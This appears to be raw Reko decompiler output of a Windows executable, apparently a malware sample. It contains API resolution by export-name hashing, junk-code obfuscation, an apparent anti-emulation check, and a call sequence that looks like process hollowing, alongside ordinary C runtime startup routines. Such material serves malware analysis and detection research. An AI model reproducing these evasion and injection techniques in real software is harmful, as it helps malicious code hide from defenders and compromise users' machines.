// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: void fn00401000()
void fn00401000()
{
	GetModuleHandleA(0x00);
	GetCurrentProcess();
	GetCurrentProcess();
	ptr32 esp_93;
	word32 ebp_94;
	byte SCZO_95;
	word32 ebx_96;
	word32 esi_97;
	struct Eq_17 * edi_98;
	word32 eax_99;
	word32 edx_100;
	word32 ecx_101;
	byte cl_102;
	byte SZO_103;
	byte C_104;
	byte SO_105;
	globals->ptr4056C0();
	int32 eax_107 = 0x00;
	do
		eax_107 = eax_107 + 0x05;
	while (eax_107 <= 0x09);
	*(esp_93 - 0x04) = ~0x3F;
	GetStdHandle(*(esp_93 - 0x04));
	*(esp_93 - 0x04) = fp - 0x14;
	*(esp_93 - 0x08) = edi_98->dw0050;
	*(esp_93 - 0x0C) = ebx_96;
	*(esp_93 - 0x10) = eax_99;
	*(esp_93 - 0x14) = globals->dw4056B0;
	ptr32 esp_143;
	word32 ebp_144;
	byte SCZO_145;
	word32 ebx_146;
	word32 esi_147;
	word32 edi_148;
	word32 eax_149;
	word32 edx_150;
	word32 ecx_151;
	byte cl_152;
	byte SZO_153;
	byte C_154;
	byte SO_155;
	globals->ptr4056C4();
	GetCurrentProcess();
	globals->dw4056C8 = 0x00010007;
	int32 eax_160 = 0x01;
	do
		eax_160 = eax_160 - 0x03;
	while (eax_160 >= 0x00);
	*(esp_143 - 0x04) = 0x004056C8;
	*(esp_143 - 0x08) = globals->dw4056B4;
	ptr32 esp_190;
	word32 ebp_191;
	byte SCZO_192;
	word32 ebx_193;
	word32 esi_194;
	word32 edi_195;
	word32 eax_196;
	word32 edx_197;
	word32 ecx_198;
	byte cl_199;
	byte SZO_200;
	byte C_201;
	byte SO_202;
	globals->ptr405994();
	GetCurrentProcess();
	globals->dw405780 = 4198882;
	Eq_9 eax_206 = GetCurrentProcess();
	*(esp_190 - 0x04) = 0x004056C8;
	*(esp_190 - 0x08) = globals->dw4056B4;
	ptr32 esp_212;
	word32 ebp_213;
	byte SCZO_214;
	word32 ebx_215;
	word32 esi_216;
	word32 edi_217;
	word32 eax_218;
	word32 edx_219;
	word32 ecx_220;
	byte cl_221;
	byte SZO_222;
	byte C_223;
	byte SO_224;
	globals->ptr405998();
	int32 eax_225 = 0x00;
	do
		eax_225 = eax_225 + 0x01;
	while (eax_225 <= 0x01);
	*(esp_212 - 0x04) = globals->dw4056B4;
	word32 esp_244;
	word32 ebp_245;
	byte SCZO_246;
	word32 ebx_247;
	word32 esi_248;
	word32 edi_249;
	word32 eax_250;
	word32 edx_251;
	word32 ecx_252;
	byte cl_253;
	byte SZO_254;
	byte C_255;
	byte SO_256;
	globals->ptr40599C();
	return;
}

// 004013E7: Register word32 fn004013E7(Register ptr32 ebp, Stack Eq_6 dwArg04, Stack word32 dwArg08, Register out ptr32 ebpOut)
word32 fn004013E7(ptr32 ebp, HMODULE dwArg04, word32 dwArg08, ptr32 & ebpOut)
{
	GetStdHandle(~0x59);
	GetCurrentProcess();
	struct Eq_208 * eax_35 = dwArg04 + (&(dwArg04 + dwArg04->ptr003C / 0x0040)->ptr003C)[0x0F] / 0x0040;
	word16 eax_38[] = dwArg04 + eax_35->dw0024 / 0x0040;
	GetCurrentProcess();
	ptr32 dwLoc04_100 = ebp;
	uint32 esi_177 = dwArg08;
	if (StgCreateStorageEx(null, 0x00, 0x00, 0x00, null, null, null, null) == 0x00)
		esi_177 = dwArg08 - 0x00045BEB;
	word32 eax_67[] = dwArg04 + eax_35->dw0020 / 0x0040;
	word32 eax_71[] = dwArg04 + eax_35->dw001C / 0x0040;
	int32 edi_158 = 0x00;
	while (true)
	{
		word32 eax_103;
		if (edi_158 >= eax_35->dw0018)
			break;
		GetStdHandle(~0x35);
		Eq_292 (* eax_128)[] = dwArg04 + eax_67[edi_158] / 0x0040;
		dwLoc24 = dwLoc24 & 0x00;
		dwLoc28 = dwLoc28 & 0x00;
		while (Mem0[dwLoc24 + eax_128:byte] != 0x00)
		{
			GetCurrentProcess();
			dwLoc28 = (int32) Mem0[dwLoc24 + eax_128:byte] ^ 0xCE ^ (dwLoc28 << 0x07 | dwLoc28 >>u 0x19);
			dwLoc24 = dwLoc24 + 0x01;
		}
		if (dwLoc28 == esi_177)
		{
			GetStdHandle(~0x34);
			eax_103 = dwArg04 + eax_71[(word32) eax_38[edi_158]] / 0x0040;
			goto l00401503;
		}
		edi_158 = edi_158 + 0x01;
	}
	dwLoc04_100 = ebp - 0x01;
	eax_103 = 0x00;
l00401503:
	word32 ebp_112;
	*ebpOut = dwLoc04_100;
	return eax_103;
}

// 0040150C: Register word32 fn0040150C(Register ptr32 ebp, Register out ptr32 ebpOut)
word32 fn0040150C(ptr32 ebp, ptr32 & ebpOut)
{
	Eq_6 eax_21 = LoadLibraryA(globals->t405000);
	GetCurrentProcess();
	ptr32 ebp_29;
	globals->ptr405DA4 = fn004013E7(fp - 0x04, eax_21, 0x0CA4A094, out ebp_29);
	GetStdHandle(~0x0A);
	ptr32 ebp_41;
	globals->ptr4056C0 = fn004013E7(ebp_29, eax_21, 0xD02A92F5, out ebp_41);
	ui32 eax_45 = *(ebp_41 - 0x04);
	ui32 edx_46 = *(ebp_41 - 0x0C);
	*(ebp_41 - 0x0C) = eax_45 + 7990 & edx_46 << 0x03 | (edx_46 + 151) + edx_46 & eax_45 * 0x08 + 2792 << (byte) (eax_45 + 0x1C29);
	ptr32 ebp_64;
	globals->ptr4056C4 = fn004013E7(ebp_41, eax_21, ~0x6C05F5A1, out ebp_64);
	ui32 edx_69 = *(ebp_64 - 0x04);
	ui32 eax_68 = *(ebp_64 - 0x0C);
	*(ebp_64 - 0x08) = eax_68 * 0x08 + 9090 | (edx_69 + 2771) + edx_69 << (byte) ((edx_69 + 3863) + eax_68 * 0x02);
	ptr32 ebp_85;
	globals->ptr405994 = fn004013E7(ebp_64, eax_21, 0xE0895544, out ebp_85);
	GetCurrentProcess();
	ptr32 ebp_94;
	globals->ptr405998 = fn004013E7(ebp_85, eax_21, 0xE0897D44, out ebp_94);
	int32 eax_101 = 0x00;
	do
	{
		word32 edx_102 = *(ebp_94 - 0x08);
		*(ebp_94 - 0x0C) = edx_102 + 5022 + edx_102;
		eax_101 = eax_101 + 0x04;
	} while (eax_101 <= 0x09);
	ptr32 ebp_112;
	globals->ptr40599C = fn004013E7(ebp_94, eax_21, 1308464494, out ebp_112);
	word32 edx_117 = *(ebp_112 - 0x0C);
	*(ebp_112 - 0x04) = 0x00 << (byte) ((edx_117 + 0x6D) + edx_117) | *(ebp_112 - 0x04) << 0x03;
	ptr32 ebp_132;
	globals->ptr405DA8 = fn004013E7(ebp_112, eax_21, 0x0B24A3AB, out ebp_132);
	GetStdHandle(~0x5C);
	ptr32 ebp_144;
	globals->ptr4059A0 = fn004013E7(ebp_132, eax_21, 4275677811, out ebp_144);
	GetModuleFileNameA(null, 4218284, 0x0104);
	GetCurrentProcess();
	lstrcpyA(0x00405EB0, globals->t40502C);
	ui32 eax_164 = *(ebp_144 - 0x04);
	*(ebp_144 - 0x14) = eax_164 * 0x02;
	*(ebp_144 - 0x10) = *(ebp_144 - 0x0C) * 0x02;
	uint32 edi_184 = *(ebp_144 - 0x10) >> (byte) (*(ebp_144 - 0x08) * 0x04 + 0x1C94);
	*(ebp_144 - 0x0C) = eax_164 << 0x03 & *(ebp_144 - 0x10) + 0xBD | (eax_164 * 0x02 << (byte) (*(ebp_144 - 0x14)) ^ *(ebp_144 - 0x08) + 1010 | eax_164 * 0x04 + 2799 >> (byte) (*(ebp_144 - 0x14)) ^ edi_184);
	lstrcatA(0x00405EB0, globals->t405028);
	GetCurrentProcess();
	lstrcatA(0x00405EB0, globals->t40501C);
	GetCurrentProcess();
	lstrcatA(0x00405EB0, 4218284);
	GetStdHandle(~0x4B);
	globals->dw405FB4 = 0x44;
	int32 eax_221 = 0x00;
	do
	{
		int32 ecx_226 = *(ebp_144 - 0x04);
		int32 edx_225 = *(ebp_144 - 0x08);
		uint32 esi_233 = (edx_225 + 0x024F) *s ((ecx_226 + 0x26F2) + ecx_226) >> (byte) (*(ebp_144 - 0x0C) * 0x08 + 212);
		byte cl_236 = (byte) (edx_225 * 0x02);
		uint32 edx_238 = esi_233 >> cl_236;
		*(ebp_144 - 0x04) = edx_238;
		eax_221 = eax_221 + 0x05;
	} while (eax_221 <= 0x02);
	globals->dw405FE0 = 0x01;
	GetStdHandle(~0x51);
	globals->w405FE4 = 0x02;
	Eq_9 eax_251 = GetStdHandle(~0x27);
	ptr32 esp_273;
	ptr32 ebp_274;
	byte SCZO_275;
	word32 ebx_276;
	word32 esi_277;
	word32 edi_278;
	word32 eax_279;
	word32 edx_280;
	word32 ecx_281;
	byte cl_282;
	byte SZO_283;
	byte C_284;
	byte SO_285;
	globals->ptr405DA4();
	int32 eax_286 = 0x04;
	do
	{
		ui32 edx_294 = (*(ebp_274 - 0x0C) << 0x03) + 116 + *(ebp_274 - 0x04) * 0x02 | *(ebp_274 - 0x08) + 0x1A39;
		*(ebp_274 - 0x08) = edx_294;
		eax_286 = eax_286 - 0x05;
	} while (eax_286 >= 0x00);
	*(esp_273 - 0x04) = globals->dw405018;
	ptr32 esp_302;
	ptr32 ebp_303;
	byte SCZO_304;
	word32 ebx_305;
	word32 esi_306;
	word32 edi_307;
	word32 eax_308;
	word32 edx_309;
	word32 ecx_310;
	byte cl_311;
	byte SZO_312;
	byte C_313;
	byte SO_314;
	globals->ptr4059A0();
	GetCurrentProcess();
	*(esp_302 - 0x04) = 4190247459;
	*(esp_302 - 0x08) = eax_308;
	ptr32 ebp_323;
	globals->ptr405FF8 = fn004013E7(ebp_303, dwArg00, dwArg04, out ebp_323);
	ui32 eax_327 = *(ebp_323 - 0x0C);
	*(ebp_323 - 0x0C) = *(ebp_323 - 0x08) + 9077 >> (byte) (eax_327 * 0x02 + 0x15) << (byte) (eax_327 * 0x02 + 0x0353) | *(ebp_323 - 0x04) * 0x02 >> (byte) (eax_327 * 0x02 + 0x62);
	*(esp_302 - 0x04) = 852236162;
	*(esp_302 - 0x08) = eax_308;
	ptr32 ebp_352;
	globals->ptr405FFC = fn004013E7(ebp_323, dwArg00, dwArg04, out ebp_352);
	GetCurrentProcess();
	*(esp_302 - 0x04) = 0xF2E9080D;
	*(esp_302 - 0x08) = eax_308;
	ptr32 ebp_361;
	globals->ptr406000 = fn004013E7(ebp_352, dwArg00, dwArg04, out ebp_361);
	*(esp_302 - 0x04) = ~0x23;
	GetStdHandle(*(esp_302 - 0x04));
	*(esp_302 - 0x04) = 0x50B59C09;
	*(esp_302 - 0x08) = eax_308;
	ptr32 ebp_373;
	globals->ptr406004 = fn004013E7(ebp_361, dwArg00, dwArg04, out ebp_373);
	int32 eax_379 = 0x01;
	do
	{
		int32 ecx_383 = *(ebp_373 - 0x04);
		int32 edx_382 = *(ebp_373 - 0x0C);
		*(ebp_373 - 0x08) = edx_382 * 0x02 * 0x02 ^ ((ecx_383 + 0x03DD) + ecx_383) *s ((edx_382 + 0x98) + edx_382);
		eax_379 = eax_379 - 0x05;
	} while (eax_379 >= 0x00);
	*(esp_302 - 0x04) = ~0x21B1B1AB;
	*(esp_302 - 0x08) = eax_308;
	ptr32 ebp_398;
	globals->ptr406008 = fn004013E7(ebp_373, dwArg00, dwArg04, out ebp_398);
	ui32 eax_402 = *(ebp_398 - 0x0C);
	ui32 edx_403 = *(ebp_398 - 0x08);
	uint32 edi_409 = edx_403 * 0x02 >> (byte) (eax_402 * 0x02);
	byte cl_411 = (byte) (eax_402 * 0x02 + 0x48);
	ui32 ecx_418 = ~0x0D8D - eax_402 & edi_409 >> cl_411 ^ eax_402 + 9622;
	ui32 eax_421 = eax_402 * 0x04 + 0x1732 ^ edx_403 * 0x02 | ecx_418;
	*(ebp_398 - 0x08) = eax_421;
	*(esp_302 - 0x04) = globals->dw40500C;
	ptr32 esp_428;
	ptr32 ebp_429;
	byte SCZO_430;
	word32 ebx_431;
	word32 esi_432;
	word32 edi_433;
	word32 eax_434;
	word32 edx_435;
	word32 ecx_436;
	byte cl_437;
	byte SZO_438;
	byte C_439;
	byte SO_440;
	globals->ptr4059A0();
	*(esp_428 - 0x04) = ~0x43;
	GetStdHandle(*(esp_428 - 0x04));
	*(esp_428 - 0x04) = 1839129292;
	*(esp_428 - 0x08) = eax_434;
	word32 * ebp_450;
	globals->ptr40600C = fn004013E7(ebp_429, dwArg00, dwArg04, out ebp_450);
	int32 eax_454 = *(ebp_450 - 0x04);
	*(ebp_450 - 0x04) = eax_454 *s (eax_454 + 3735) * 0x02 * 0x02 & eax_454 * 0x04 + 3577;
	fn00401000();
	int32 eax_464 = 0x00;
	do
	{
		ui32 edx_468 = *(ebp_450 - 0x0C);
		int32 ebx_469 = *(ebp_450 - 0x04);
		*(ebp_450 - 0x04) = edx_468 * 0x04 + 0x1EA2 ^ (ebx_469 + 0xCB) + ebx_469 & edx_468 * 0x02 << (byte) (((ebx_469 << 0x03) - (edx_468 * 0x02 + 4040)) - (edx_468 * 0x02 + 0xF9)) ^ *(ebp_450 - 0x08) << 0x03 & (ebx_469 + 0x1F1D) *s (edx_468 * 0x02) << (byte) (edx_468 * 0x02 + 0x24);
		eax_464 = eax_464 + 0x02;
	} while (eax_464 <= 0x06);
	*(ebp_450 - 0x04) = 0x303AEB76;
	*(ebp_450 - 0x08) = 1061921675;
	*(ebp_450 - 0x0C) = *(ebp_450 - 0x0C) - 0x01;
	word32 ebp_511;
	*ebpOut = *ebp_450;
	return 0x00;
}

// 00401C10: Register Eq_41 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	fs->ptr0000 = fp - 0x14;
	globals->t405058 = fn004027E0(0x02000000);
	ptr32 ebp_142 = fp - 0x04;
	if (fn00401FD0() == 0x00)
		fn004020C0(0x01);
	fn004020D0(edx, ebx);
	fn00402140();
	fn00402190(fp - 0x04);
	fn00402570(fp - 0x04);
	fn00402610();
	ptr32 esp_141 = fp - 0x70;
	<anonymous> ** ebx_154 = (<anonymous> **) 0x004040E0;
	while (ebx_154 < (<anonymous> **) 0x004040E0)
	{
		byte SCZO_144;
		word32 ebx_145;
		word32 esi_146;
		word32 edi_147;
		word32 ecx_148;
		word32 eax_149;
		byte SZO_150;
		byte C_151;
		byte Z_152;
		word32 edx_153;
		(*ebx_154)();
		ebx_154 = ebx_145 + 0x04;
	}
	Eq_4 edx_137;
	union Eq_4 * esp_63 = esp_141 - 0x04;
	*esp_63 = (union Eq_4 *) (fp - 100);
	GetStartupInfoA(*esp_63);
	*esp_63 = (union Eq_4 *) 0x00;
	Eq_6 eax_68 = GetModuleHandleA(*esp_63);
	word32 eax_71 = fn004026D0();
	if (0x00 != 0x00)
		edx_137 = (word32) wLoc34;
	else
		edx_137.u0 = 0x0A;
	*esp_63 = (union Eq_4 *) edx_137;
	*(esp_63 - 0x04) = eax_71;
	*(esp_63 - 0x08) = 0x00;
	*(esp_63 - 0x0C) = (HMODULE *) eax_68;
	ptr32 ebp_122;
	Eq_41 eax_129 = fn0040150C(ebp_142, out ebp_122);
	ptr32 esp_121 = (char *) esp_63 + 0x04;
	Eq_41 ebx_125 = eax_129;
	<anonymous> ** esi_134 = (<anonymous> **) 0x004040E0;
	while (esi_134 < (<anonymous> **) 0x004040E0)
	{
		byte SCZO_124;
		word32 esi_126;
		word32 edi_127;
		word32 ecx_128;
		byte SZO_130;
		byte C_131;
		byte Z_132;
		word32 edx_133;
		(*esi_134)();
		esi_134 = esi_126 + 0x04;
	}
	*(esp_121 - 0x04) = (uint32) ebx_125;
	fn00402710(ebx_125, dwArg00);
	*(ebp_122 - 0x04) = *(ebp_122 - 0x04) | ~0x00;
	fs->ptr0000 = *(ebp_122 - 0x10);
	return eax_129;
}

// 00401FD0: Register word32 fn00401FD0()
word32 fn00401FD0()
{
	Eq_9 eax_8 = HeapCreate(0x01, 0x1000, 0x00);
	globals->t405698 = eax_8;
	if (eax_8 == null)
		return 0x00;
	else
		return 0x01;
}

// 00402020: Register Eq_1186 fn00402020(Stack uint32 dwArg04)
Eq_1186 fn00402020(uint32 dwArg04)
{
	return HeapAlloc(globals->t405698, 0x01, dwArg04);
}

// 00402060: void fn00402060(Stack uint32 dwArg04)
void fn00402060(uint32 dwArg04)
{
	HeapFree(globals->t405698, 0x01, dwArg04);
	return;
}

// 004020C0: void fn004020C0(Stack word32 dwArg04)
void fn004020C0(word32 dwArg04)
{
	ExitProcess(dwArg04);
}

// 004020D0: void fn004020D0(Register word32 edx, Register word32 ebx)
void fn004020D0(word32 edx, word32 ebx)
{
	if ((SCZDOP ^ 0x00200000 ^ SCZDOP) != 0x00)
	{
		int32 eax_41;
		word32 ebx_42;
		word32 ecx_43;
		word32 edx_44;
		__cpuid(0x00, SCZDOP, &eax_41, &ebx_42, &ecx_43, &edx_44);
		if (eax_41 >= 0x01)
		{
			word32 eax_48;
			word32 ebx_49;
			ui32 ecx_50;
			ui32 edx_51;
			__cpuid(0x01, ecx_43, &eax_48, &ebx_49, &ecx_50, &edx_51);
			ui32 eax_52 = 0x00;
			if ((edx_51 & 0x00800000) != 0x00)
				eax_52 = 0x01;
			if ((edx_51 & 0x01000000) != 0x00)
				eax_52 = eax_52 | 0x10;
			if ((edx_51 & 0x02000000) != 0x00)
				eax_52 = eax_52 | 0x02;
			if ((edx_51 & 0x04000000) != 0x00)
				eax_52 = eax_52 | 0x04;
			if ((ecx_50 & 0x01) != 0x00)
				eax_52 = eax_52 | 0x08;
			globals->dw405110 = eax_52;
		}
	}
	return;
}

// 00402140: void fn00402140()
void fn00402140()
{
	GetSystemTimeAsFileTime(&globals->t4056A0);
	return;
}

// 00402190: void fn00402190(Register ptr32 ebp)
void fn00402190(ptr32 ebp)
{
	Eq_1472 eax_19 = fn00402DB0(0x0100);
	Eq_1472 ebx_22 = eax_19;
	if (eax_19 == 0x00)
		fn004020C0(0x01);
	globals->t406010 = eax_19;
	globals->dw406110 = 0x20;
	while (ebx_22 < (word32) globals->t406010 + 0x0100)
	{
		*((word32) ebx_22 + 0x04) = 0x00;
		*ebx_22 = ~0x00;
		*((word32) ebx_22 + 0x05) = 0x0A;
		ebx_22 = (word32) ebx_22 + 0x08;
	}
	*(fp - 0x6C) = fp - 0x48;
	GetStartupInfoA(*(fp - 0x6C));
	if (wLoc16 != 0x00 && dwLoc14 != null)
	{
		int32 esi_202 = *dwLoc14;
		byte * dwLoc54_204 = dwLoc14 + 0x01;
		word32 * dwLoc50_207 = dwLoc14 + 0x01 + esi_202;
		if (esi_202 > 0x0800)
			esi_202 = 0x0800;
		ui32 edi_211 = 0x01;
		if (globals->dw406110 < esi_202)
		{
			do
			{
				*(fp - 0x6C) = 0x0100;
				Eq_1472 eax_293 = fn00402DB0(dwArg00);
				Eq_1472 ebx_296 = eax_293;
				if (eax_293 == 0x00)
				{
					esi_202 = globals->dw406110;
					break;
				}
				(&globals->t406010)[edi_211] = eax_293;
				globals->dw406110 = globals->dw406110 + 0x20;
				while (ebx_296 < (&globals->t406010)[edi_211] + 0x0100)
				{
					*((word32) ebx_296 + 0x04) = 0x00;
					*ebx_296 = ~0x00;
					*((word32) ebx_296 + 0x05) = 0x0A;
					ebx_296 = (word32) ebx_296 + 0x08;
				}
				edi_211 = edi_211 + 0x01;
			} while (globals->dw406110 < esi_202);
		}
		int32 edi_222 = 0x00;
		if (esi_202 > 0x00)
		{
l00402288:
			word32 eax_235 = *dwLoc50_207;
			if (eax_235 != ~0x00)
			{
				ui32 edx_255 = (word32) *dwLoc54_204;
				if ((edx_255 & 0x01) == 0x00)
					goto l004022D6;
				if ((edx_255 & 0x08) != 0x00)
				{
l004022B3:
					struct Eq_1792 * ebx_272 = (&globals->t406010)[edi_222 >> 0x05] + (edi_222 & 0x1F) * 0x08;
					ebx_272->dw0000 = *dwLoc50_207;
					ebx_272->b0004 = *dwLoc54_204;
					goto l004022D6;
				}
				*(fp - 0x6C) = eax_235;
				if (GetFileType(*(fp - 0x6C)) != 0x00)
					goto l004022B3;
			}
l004022D6:
			edi_222 = edi_222 + 0x01;
			dwLoc54_204 = dwLoc54_204 + 0x01;
			dwLoc50_207 = dwLoc50_207 + 0x01;
			if (edi_222 < esi_202)
				goto l00402288;
			goto l004022E2;
		}
	}
l004022E2:
	int32 edi_61 = 0x00;
l004022E4:
	struct Eq_1576 * ebx_81 = (word32) globals->t406010 + edi_61 * 0x08;
	if (ebx_81->t0000 != (void *) ~0x00)
	{
		ebx_81->b0004 = ebx_81->b0004 | 0x80;
		goto l00402392;
	}
	word32 eax_118;
	ebx_81->b0004 = 0x81;
	ebx_81->b0004 = 0x81;
	if (edi_61 == 0x00)
		eax_118 = ~0x09;
	else if (edi_61 == 0x01)
		eax_118 = ~0x0A;
	else
		eax_118 = ~0x0B;
	*(fp - 0x6C) = eax_118;
	Eq_9 eax_121 = GetStdHandle(*(fp - 0x6C));
	Eq_9 esi_123 = eax_121;
	if (eax_121 != (void *) ~0x00)
	{
		*(fp - 0x6C) = (HANDLE *) eax_121;
		Eq_41 eax_136 = GetFileType(*(fp - 0x6C));
		if (eax_136 != 0x00)
		{
			Eq_9 eax_142 = GetCurrentProcess();
			Eq_9 eax_144 = GetCurrentProcess();
			*(fp - 0x6C) = 0x02;
			*(fp - 0x70) = 0x01;
			*(fp - 116) = 0x00;
			*(fp - 0x78) = fp - 0x4C;
			*(fp - 0x7C) = (HANDLE *) eax_144;
			*(fp - 0x80) = (HANDLE *) eax_121;
			*(fp - 0x84) = (HANDLE *) eax_142;
			if (DuplicateHandle(*(fp - 0x84), *(fp - 0x80), *(fp - 0x7C), *(fp - 0x78), *(fp - 116), *(fp - 0x70), *(fp - 0x6C)) != 0x00)
				esi_123 = dwLoc4C;
			ebx_81->t0000 = esi_123;
			if ((eax_136 & 0xFF) == 0x02)
				ebx_81->b0004 = ebx_81->b0004 | 0x40;
			else if ((eax_136 & 0xFF) == 0x03)
				ebx_81->b0004 = ebx_81->b0004 | 0x08;
l00402392:
			edi_61 = edi_61 + 0x01;
			if (edi_61 < 0x03)
				goto l004022E4;
			*(fp - 0x6C) = globals->dw406110;
			SetHandleCount(*(fp - 0x6C));
			return;
		}
	}
	ebx_81->b0004 = ebx_81->b0004 | 0x40;
	goto l00402392;
}

// 004023E0: void fn004023E0(Stack Eq_515 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C, Stack ptr32 dwArg10, Stack ptr32 dwArg14)
void fn004023E0(Eq_515 dwArg04, word32 dwArg08, word32 dwArg0C, ptr32 dwArg10, ptr32 dwArg14)
{
	*dwArg14 = 0x00;
	*dwArg10 = 0x01;
	word32 * edx_19 = dwArg08;
	byte * ebx_105 = dwArg0C;
	struct Eq_1905 * edi_106 = dwArg04;
	if (dwArg08 != null)
	{
		*dwArg08 = dwArg0C;
		edx_19 = dwArg08 + 0x01;
	}
	if (dwArg04->b0000 == 0x22)
	{
		while (true)
		{
			edi_106 = edi_106 + 0x01;
			if (edi_106->b0000 == 0x22 || edi_106->b0000 == 0x00)
				break;
			if (ebx_105 != null)
			{
				*ebx_105 = edi_106->b0000;
				ebx_105 = ebx_105 + 0x01;
			}
			*dwArg14 = *dwArg14 + 0x01;
		}
		if (ebx_105 != null)
		{
			*ebx_105 = 0x00;
			ebx_105 = ebx_105 + 0x01;
		}
		*dwArg14 = *dwArg14 + 0x01;
		if (edi_106->b0000 == 0x22)
			edi_106 = edi_106 + 0x01;
	}
	else
	{
		do
		{
			if (ebx_105 != null)
			{
				*ebx_105 = edi_106->b0000;
				ebx_105 = ebx_105 + 0x01;
			}
			*dwArg14 = *dwArg14 + 0x01;
			edi_106 = edi_106 + 0x01;
			byte al_289 = edi_106->b0000;
		} while (al_289 == 0x20 || (al_289 == 0x00 || al_289 == 0x09));
		if (al_289 == 0x00)
			edi_106 = edi_106 - 0x01;
		else if (ebx_105 != null)
			*(ebx_105 - 0x01) = 0x00;
	}
	word32 dwLoc08_101 = 0x00;
	while (true)
	{
		if (edi_106->b0000 != 0x00)
		{
			while (true)
			{
				byte al_227 = edi_106->b0000;
				if (al_227 != 0x20 && al_227 != 0x09)
					break;
				edi_106 = edi_106 + 0x01;
			}
		}
		if (edi_106->b0000 == 0x00)
			break;
		if (edx_19 != null)
		{
			*edx_19 = ebx_105;
			edx_19 = edx_19 + 0x01;
		}
		*dwArg10 = *dwArg10 + 0x01;
		while (true)
		{
			uint32 dwLoc14_102 = 0x00;
			while (edi_106->b0000 == 0x5C)
			{
				edi_106 = edi_106 + 0x01;
				dwLoc14_102 = dwLoc14_102 + 0x01;
			}
			word32 dwLoc0C_165 = 0x01;
			if (edi_106->b0000 == 0x22)
			{
				dwLoc0C_165 = 0x01;
				if ((bLoc14 & 0x01) == 0x00)
				{
					if (dwLoc08_101 != 0x00)
					{
						if (edi_106[0x01] == 0x22)
						{
							edi_106 = edi_106 + 0x01;
							dwLoc0C_165 = 0x01;
						}
						else
							dwLoc0C_165 = 0x00;
					}
					else
						dwLoc0C_165 = 0x00;
					dwLoc08_101 = (word32) (dwLoc08_101 == 0x00);
				}
				dwLoc14_102 = dwLoc14_102 >> 0x01;
			}
			while (true)
			{
				dwLoc14_102 = dwLoc14_102 - 0x01;
				if (dwLoc14_102 == 0x00)
					break;
				if (ebx_105 != null)
				{
					*ebx_105 = 0x5C;
					ebx_105 = ebx_105 + 0x01;
				}
				*dwArg14 = *dwArg14 + 0x01;
			}
			byte al_113 = edi_106->b0000;
			if (al_113 == 0x00 || dwLoc08_101 == 0x00 && (al_113 == 0x20 || al_113 == 0x09))
				break;
			if (dwLoc0C_165 != 0x00)
			{
				if (ebx_105 != null)
				{
					*ebx_105 = edi_106->b0000;
					ebx_105 = ebx_105 + 0x01;
				}
				*dwArg14 = *dwArg14 + 0x01;
			}
			edi_106 = edi_106 + 0x01;
		}
		if (ebx_105 != null)
		{
			*ebx_105 = 0x00;
			ebx_105 = ebx_105 + 0x01;
		}
		*dwArg14 = *dwArg14 + 0x01;
	}
	if (edx_19 != null)
		*edx_19 = 0x00;
	*dwArg10 = *dwArg10 + 0x01;
	return;
}

// 00402570: void fn00402570(Register ptr32 ebp)
void fn00402570(ptr32 ebp)
{
	Eq_515 eax_13 = GetCommandLineA();
	Eq_515 ebx_14 = eax_13;
	if (*eax_13 == 0x00)
	{
		GetModuleFileNameA(null, fp - 0x0110, 0x0104);
		ebx_14 = fp - 0x0110;
	}
	fn004023E0(ebx_14, 0x00, 0x00, fp - 0x08, fp - 0x0C);
	Eq_1472 eax_40 = fn00402DB0(dwLoc0C + dwLoc08 * 0x04);
	if (eax_40 == 0x00)
		fn004020C0(0x01);
	*(fp - 0x011C) = fp - 0x0C;
	*(fp - 288) = fp - 0x08;
	*(fp - 292) = (word32) eax_40 + dwLoc08 * 0x04;
	*(fp - 0x0128) = (union Eq_1472 *) eax_40;
	*(fp - 300) = (union Eq_515 *) ebx_14;
	fn004023E0(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10);
	globals->dw405040 = dwLoc08 - 0x01;
	globals->t405044 = eax_40;
	return;
}

// 00402610: void fn00402610()
void fn00402610()
{
	Eq_2262 eax_146 = GetEnvironmentStrings();
	Eq_2262 ebx_152 = eax_146;
	if (eax_146 == 0x00)
		ebx_152 = globals->t405114;
	Eq_2262 esi_148 = ebx_152;
	word32 ecx_145 = 0x00;
	while (*esi_148 != 0x00)
	{
		Eq_2279 eax_132 = eax_146 | ~0x00;
		do
			eax_132 = (word32) eax_132 + 0x01;
		while (Mem0[esi_148 + eax_132:byte] != 0x00);
		if (*esi_148 != 0x3D)
			ecx_145 = ecx_145 + (eax_132 + 0x01);
		eax_146 = eax_132 + 0x01;
		esi_148 = esi_148 + (eax_132 + 0x01);
	}
	Eq_1472 eax_105 = fn00402DB0(ecx_145 + 0x01);
	globals->t40504C = eax_105;
	Eq_1472 edi_103 = eax_105;
	if (globals->t40504C == 0x00)
		fn004020C0(0x01);
	Eq_2262 esi_107 = ebx_152;
	while (*esi_107 != 0x00)
	{
		Eq_2320 eax_85 = eax_105 | ~0x00;
		do
			eax_85 = (word32) eax_85 + 0x01;
		while (Mem48[esi_107 + eax_85:byte] != 0x00);
		if (*esi_107 != 0x3D)
		{
			*(fp - 0x18) = (union Eq_1472 *) edi_103;
			Eq_2262 edx_110 = esi_107;
			int32 ecx_113 = edi_103 - esi_107;
			do
			{
				byte al_116 = *edx_110;
				*((word32) edx_110 + ecx_113) = al_116;
				edx_110 = edx_110 + 0x01;
			} while (al_116 != 0x00);
			edi_103 = edi_103 + (eax_85 + 0x01);
		}
		eax_105 = eax_85 + 0x01;
		esi_107 = esi_107 + (eax_85 + 0x01);
	}
	*edi_103 = 0x00;
	if (ebx_152 != globals->t405114)
	{
		*(fp - 0x18) = (union Eq_2262 *) ebx_152;
		FreeEnvironmentStringsA(*(fp - 0x18));
	}
	return;
}

// 004026D0: Register Eq_515 fn004026D0()
Eq_515 fn004026D0()
{
	Eq_515 eax_2 = GetCommandLineA();
	Eq_515 edx_10 = eax_2;
	if (*eax_2 == 0x22)
	{
		do
			edx_10 = edx_10 + 0x01;
		while (*edx_10 == 0x22 || *edx_10 == 0x00);
		if (*edx_10 == 0x22)
			edx_10 = edx_10 + 0x01;
	}
	else
	{
		while (*edx_10 > 0x20)
			edx_10 = edx_10 + 0x01;
	}
	while (true)
	{
		cu8 al_12 = *edx_10;
		if (al_12 == 0x00 || al_12 > 0x20)
			break;
		edx_10 = edx_10 + 0x01;
	}
	return edx_10;
}

// 00402710: void fn00402710(Register Eq_41 ebx, Stack word32 dwArg04)
void fn00402710(DWORD ebx, word32 dwArg04)
{
	ptr32 esp_2 = fp - 0x04;
	word32 ebx_19 = dwArg04;
	if (globals->dw405258 < 0x50)
	{
		do
		{
